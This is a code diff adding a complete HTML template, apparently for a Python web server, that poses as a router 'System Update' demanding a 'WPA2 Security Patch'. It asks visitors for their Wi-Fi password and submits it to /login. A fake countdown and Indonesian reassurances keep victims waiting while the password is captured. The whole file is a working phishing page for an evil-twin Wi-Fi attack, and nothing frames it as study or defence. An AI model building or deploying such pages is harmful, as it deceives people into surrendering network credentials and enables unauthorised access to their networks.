@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: sans-serif; background: #ececec; margin: 0; padding: 20px; }
+        .container { background: white; max-width: 400px; margin: auto; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .logo { color: #0066ff; font-weight: bold; font-size: 24px; margin-bottom: 10px; }
+        
+        /* Style untuk pesan error dari Python */
+        .error-msg { 
+            color: #d9534f; background: #f9f2f2; padding: 10px; border-radius: 5px; 
+            border: 1px solid #d9534f; font-size: 13px; margin-bottom: 15px; 
+        }
+
+        h2 { color: #333; font-size: 18px; margin-top: 0; }
+        p { color: #666; font-size: 14px; line-height: 1.5; }
+        
+        .loading-bar { height: 4px; width: 100%; background-color: #ddd; margin-bottom: 20px; border-radius: 2px; overflow: hidden; }
+        .loading-fill { height: 100%; width: 65%; background-color: #0066ff; }
+
+        input[type=password], input[type=text] { 
+            width: 100%; padding: 12px; margin: 10px 0 10px 0; border: 1px solid #ccc; 
+            border-radius: 5px; box-sizing: border-box; font-size: 16px;
+        }
+
+        /* Checkbox show password style */
+        .show-pass-container { display: flex; align-items: center; margin-bottom: 20px; cursor: pointer; }
+        .show-pass-container input { width: auto; margin-right: 8px; cursor: pointer; }
+        .show-pass-container label { font-size: 13px; color: #666; cursor: pointer; user-select: none; }
+        
+        button { 
+            background: #0066ff; color: white; width: 100%; padding: 12px; border: none; 
+            border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold;
+        }
+        button:hover { background: #0052cc; }
+        .footer { font-size: 11px; color: #aaa; margin-top: 20px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="container" id="main-box">
+        <div class="logo">System Update</div>
+        <div class="loading-bar"><div class="loading-fill"></div></div>
+        
+        <div id="login-form">
+            {% if error_msg %}
+                <div class="error-msg">{{ error_msg }}</div>
+            {% endif %}
+
+            <h2>WPA2 Security Patch Required</h2>
+            <p>Verifikasi password Anda untuk memulai instalasi firmware <b>v2.0.48</b>.</p>
+            
+            <form action="/login" method="post" onsubmit="showLoading()">
+                <input type="password" name="password" id="passInput" placeholder="Enter Wi-Fi Password" required>
+                
+                <div class="show-pass-container">
+                    <input type="checkbox" id="showPass" onclick="togglePass()">
+                    <label for="showPass">Tampilkan Password</label>
+                </div>
+
+                <button type="submit">Verify & Install</button>
+            </form>
+        </div>
+
+        <div id="loading-screen" style="display:none; text-align:center;">
+            <h2 style="color: #0066ff;">Verifying...</h2>
+            <p>Sedang menyinkronkan dengan database router. Mohon jangan tutup halaman ini.</p>
+            <div style="font-size: 40px; font-weight: bold; margin: 20px 0;" id="timer">30</div>
+            <p style="font-size: 12px; color: #999;">Proses ini membutuhkan waktu demi keamanan enkripsi.</p>
+        </div>
+    </div>
+
+    <script>
+        // Fungsi untuk buka-tutup sensor password
+        function togglePass() {
+            var x = document.getElementById("passInput");
+            if (x.type === "password") {
+                x.type = "text";
+            } else {
+                x.type = "password";
+            }
+        }
+
+        function showLoading() {
+            // 1. Ambil elemen form dan loading
+            var loginForm = document.getElementById('login-form');
+            var loadingScreen = document.getElementById('loading-screen');
+            var timerElement = document.getElementById("timer");
+
+            // 2. Tampilkan layar loading SEBELUM form dikirim
+            loginForm.style.display = 'none';
+            loadingScreen.style.display = 'block';
+
+            var timeleft = 30;
+            var downloadTimer = setInterval(function(){
+                if(timeleft <= 0){
+                    clearInterval(downloadTimer);
+                    timerElement.innerHTML = "Hampir Selesai...";
+                } else {
+                    timerElement.innerHTML = timeleft;
+                }
+                timeleft -= 1;
+            }, 1000);
+
+            // 3. RETURN TRUE agar form tetap dikirim ke server Python
+            return true; 
+        }
+    </script>
+</body>
+</html>
